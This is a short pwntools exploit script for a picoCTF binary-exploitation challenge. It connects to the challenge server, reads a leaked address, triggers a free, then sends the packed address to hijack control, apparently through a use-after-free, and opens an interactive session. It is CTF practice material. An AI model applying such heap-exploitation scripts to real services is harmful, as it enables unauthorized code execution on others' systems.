from pwn import *

context(log_level="debug", arch="i386", os="linux")

# r = process("./vuln")
r = remote("mercury.picoctf.net", 61817)
r.sendlineafter("(e)xit\n", b"s")
r.recvuntil("OOP! Memory leak...")
flag = int(r.recvline(), 16)
r.sendline(b"i")
r.sendlineafter("You're leaving already(Y/N)?", b"Y")
r.sendlineafter("(e)xit\n", b"l")
r.sendline(p32(flag) + p32(0))
r.interactive()